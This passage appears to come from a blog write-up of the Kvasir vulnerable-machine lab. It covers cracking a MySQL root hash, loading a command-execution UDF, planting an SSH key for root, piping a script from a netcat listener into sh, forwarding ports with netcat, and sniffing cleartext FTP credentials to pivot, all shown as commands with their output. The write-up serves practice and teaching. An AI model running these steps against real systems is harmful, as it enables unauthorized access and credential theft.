+<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>
+
+<h3>cracking root&rsquo;s MySQL password</h3>
+
+<p>Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, echo the hash to a file</span>
+</span><span class='line'>root@kali:~# <span class="nb">echo</span> <span class="s2">&quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&quot;</span> &gt; db.root
+</span><span class='line'>
+</span><span class='line'><span class="c"># next, we tell hash cat the type of hash we have and wait a few seconds :)</span>
+</span><span class='line'>root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
+</span><span class='line'>This copy of hashcat will expire on 01.01.2015. Please upgrade to <span class="k">continue </span>using hashcat.
+</span><span class='line'>
+</span><span class='line'>Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
+</span><span class='line'>
+</span><span class='line'>Added hashes from file db.root: 1 <span class="o">(</span>1 salts<span class="o">)</span>
+</span><span class='line'>Activating quick-digest mode <span class="k">for </span>single-hash
+</span><span class='line'>
+</span><span class='line'>NOTE: press enter <span class="k">for </span>status-screen
+</span><span class='line'>
+</span><span class='line'>ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater
+</span><span class='line'>
+</span><span class='line'>All hashes have been recovered
+</span><span class='line'>
+</span><span class='line'>Input.Mode: Dict <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+</span><span class='line'>Index.....: 1/5 <span class="o">(</span>segment<span class="o">)</span>, 3627099 <span class="o">(</span>words<span class="o">)</span>, 33550339 <span class="o">(</span>bytes<span class="o">)</span>
+</span><span class='line'>Recovered.: 1/1 hashes, 1/1 salts
+</span><span class='line'>Speed/sec.: - plains, 3.27M words
+</span><span class='line'>Progress..: 281260/3627099 <span class="o">(</span>7.75%<span class="o">)</span>
+</span><span class='line'>Running...: --:--:--:--
+</span><span class='line'>Estimated.: 00:00:00:01
+</span><span class='line'>
+</span><span class='line'>Started: Sun Nov  9 14:07:14 2014
+</span><span class='line'>Stopped: Sun Nov  9 14:07:14 2014
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;show grants;&#39;</span>
+</span><span class='line'>Grants <span class="k">for </span>root@192.168.2.100
+</span><span class='line'>GRANT ALL PRIVILEGES ON *.* TO <span class="s1">&#39;root&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span> IDENTIFIED BY PASSWORD <span class="s1">&#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39;</span> WITH GRANT OPTION
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>loading the UDF remotely</h3>
+
+<p>With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>
+
+<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -g -c raptor_udf.c -fPIC
+</span><span class='line'>gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;select @@plugin_dir;&#39;</span>
+</span><span class='line'>@@plugin_dir
+</span><span class='line'>/usr/lib/mysql/plugin/
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>
+
+<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol "do_system" in raptor_udf.so</code>. :\</p>
+
+<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat load_udf.sh
+</span><span class='line'>touch log
+</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select 0x7f454</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">0000000000000 into dumpfile &quot;/usr/lib/mysql/plugin/raptor_udf.so&quot;;&#39;</span> 2&gt;&gt; log
+</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;create function sys_exec returns integer soname &quot;raptor_udf.so&quot;;&#39;</span> 2&gt;&gt; log
+</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select * from mysql.func;&#39;</span> 2&gt;&gt; log
+</span><span class='line'>
+</span><span class='line'><span class="c"># this adds me a SSH key to roots authorized keys using the command execution udf we have prepared</span>
+</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;select sys_exec(&quot;echo \&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&quot; &gt; /root/.ssh/authorized_keys&quot;)&#39;</span> 2&gt;&gt; log
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># on the attacking machine, I opened netcat with my mysql commands</span>
+</span><span class='line'>root@kali:~# nc -lvp 4444 &lt; load_udf.sh
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span><span class='line'>
+</span><span class='line'><span class="c"># then on the original netcat shell I have, read it</span>
+</span><span class='line'>timeout 3 nc 192.168.56.101 4444 <span class="p">|</span> sh
+</span><span class='line'>name    ret dl  <span class="nb">type</span>
+</span><span class='line'>sys_exec    2   raptor_udf.so   <span class="k">function</span>
+</span><span class='line'>sys_exec<span class="o">(</span><span class="err">&quot;</span><span class="nb">echo</span> <span class="se">\&quot;</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
+</span><span class='line'>0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>
+
+<h2>ssh to db host</h2>
+
+<p>With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>
+
+<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#from nc(1)</span>
+</span><span class='line'>OPTIONS
+</span><span class='line'>       -c string    specify shell commands to <span class="nb">exec </span>after connect <span class="o">(</span>use with caution<span class="o">)</span>.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>
+
+<p><img src="https://i.imgur.com/7IggbMC.jpg"></p>
+
+<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># listen on tcp/4444, re-listening on tcp/222 on a new connection</span>
+</span><span class='line'>root@kali:~# nc -lvp 4444 -c <span class="s2">&quot;nc -lvp 222&quot;</span>
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>nc 192.168.56.101 4444 -c <span class="s2">&quot;nc 192.168.2.200 22&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 4444 -c <span class="s2">&quot;nc -lvp 222&quot;</span>
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span><span class='line'>
+</span><span class='line'><span class="c"># connection comes in from 192.168.1.100</span>
+</span><span class='line'>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
+</span><span class='line'>connect to <span class="o">[</span>192.168.56.101<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.102<span class="o">]</span> 53870
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 222 ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>
+
+<p><img src="https://i.imgur.com/A2463Kc.png"></p>
+
+<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
+</span><span class='line'>Linux db 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
+</span><span class='line'>root@db:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>
+
+<p><img src="https://i.imgur.com/wHNJJ5g.png"></p>
+
+<p>8-)</p>
+
+<h2>not exactly nsa level spying but heh</h2>
+
+<p>Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# cat /etc/hosts
+</span><span class='line'><span class="c"># 192.168.3.40  celes</span>
+</span><span class='line'><span class="c"># 192.168.3.50  terra</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ps -ef
+</span><span class='line'>UID        PID  PPID  C STIME TTY          TIME CMD
+</span><span class='line'>root         1     0  0 Nov08 ?        00:00:00 init <span class="o">[</span>3<span class="o">]</span>
+</span><span class='line'>root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
+</span><span class='line'>root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
+</span><span class='line'>root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+</span><span class='line'>root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir<span class="o">=</span>/usr --datadir<span class="o">=</span>/var/lib/mysql --plugin-dir<span class="o">=</span>/usr/lib/mysql/plugin --user<span class="o">=</span>root --pid-file<span class="o">=</span>/var/run/mysqld/mysqld
+</span><span class='line'>root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
+</span><span class='line'>root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd <span class="o">(</span>SERVER<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# head /root/.words.txt
+</span><span class='line'>borne
+</span><span class='line'>precombatting
+</span><span class='line'>noncandescent
+</span><span class='line'>cushat
+</span><span class='line'>lushness
+</span><span class='line'>precensure
+</span><span class='line'>romishness
+</span><span class='line'>nonderivable
+</span><span class='line'>overqualification
+</span><span class='line'>superkojiman
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And finally, a troll flag :D</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# cat /root/flag
+</span><span class='line'>This is not the flag you<span class="err">&#39;</span>re looking <span class="k">for</span>... :p
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>
+
+<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# tcpdump -i eth1
+</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
+</span><span class='line'>listening on eth1, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
+</span><span class='line'>13:19:01.355970 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>S<span class="o">]</span>, seq 2471029534, win 14600, options <span class="o">[</span>mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5<span class="o">]</span>, length 0
+</span><span class='line'>13:19:01.355988 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags <span class="o">[</span>S.<span class="o">]</span>, seq 2507516314, ack 2471029535, win 14480, options <span class="o">[</span>mss 1460,sackOK,TS val ack 535, win 490, options <span class="o">[</span>nop,nop,TS val 13092837 ecr 13092836<span class="o">]</span>, length 0
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>13:19:01.378604 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 535:548, ack 53, win 453, options <span class="o">[</span>nop,nop,TS val 13092837 ecr 13092837<span class="o">]</span>, length 13
+</span><span class='line'>13:19:01.378631 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>R<span class="o">]</span>, seq 2471029587, win 0, length 0
+</span><span class='line'>^C
+</span><span class='line'>29 packets captured
+</span><span class='line'>29 packets received by filter
+</span><span class='line'>0 packets dropped by kernel
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I changed the command to add the <code>-X</code> flag as this looked like FTP traffic flowing over the interface (you haven&rsquo;t forgotten the ftp server yet have you?).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>13:25:01.387981 IP 192.168.3.200.ftp &gt; 192.168.3.40.36437: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 321:359, ack 13, win 453, options <span class="o">[</span>nop,nop,TS val 13182840 ecr 13182839<span class="o">]</span>, length 38
+</span><span class='line'>    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~<span class="err">&quot;</span>@.@.4+....
+</span><span class='line'>    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...<span class="o">(</span>...U..Z..ZT.
+</span><span class='line'>    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........<span class="s1">&#39;x</span>
+</span><span class='line'><span class="s1">    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..&#39;</span>w331.User.cel
+</span><span class='line'>    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
+</span><span class='line'>    0x0050:  7265 7175 6972 6564 0d0a                 required..
+</span><span class='line'>
+</span><span class='line'>13:25:01.388050 IP 192.168.3.40.36437 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 13:32, ack 359, win 490, options <span class="o">[</span>nop,nop,TS val 13182840 ecr 13182840<span class="o">]</span>, length 19
+</span><span class='line'>    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&gt;r...<span class="o">(</span>
+</span><span class='line'>    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
+</span><span class='line'>    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............<span class="s1">&#39;x</span>
+</span><span class='line'><span class="s1">    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..&#39;</span>xPASS.im22BF4
+</span><span class='line'>    0x0040:  4858 6e30 310d 0a                        HXn01..
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>
+
+<p><img src="https://i.imgur.com/YiwWzsy.png"></p>
+
+<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>
+
+<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ssh celes@192.168.3.40
+</span><span class='line'>celes@192.168.3.40<span class="err">&#39;</span>s password: <span class="c"># entered im22BF4HXn01</span>
+</span><span class='line'>Linux dev1 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>You have mail.
+</span><span class='line'>Last login: Thu Sep  4 09:20:00 2014
+</span><span class='line'>celes@dev1:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>finding terras secret</h2>
+
+<p>Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>
+
+<p><img src="https://i.imgur.com/nXpoEBM.png"></p>
+
+<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>
+
+<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which we I in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>cat /var/spool/mail/celes
+</span><span class='line'>Return-path: &lt;celes@localhost&gt;
+</span><span class='line'>Received: from celes by localhost with <span class="nb">local</span> <span class="o">(</span>Exim 4.80<span class="o">)</span>
+</span><span class='line'>    <span class="o">(</span>envelope-from &lt;celes@localhost&gt;<span class="o">)</span>
+</span><span class='line'>    id 1XHczw-0000V2-8y
+</span><span class='line'>    <span class="k">for </span>celes@127.0.0.1<span class="p">;</span> Wed, 13 Aug 2014 19:10:08 +0100
+</span><span class='line'>Date: Wed, 13 Aug 2014 19:10:08 +0100
+</span><span class='line'>To: celes@127.0.0.1
+</span><span class='line'>Subject: Reminder
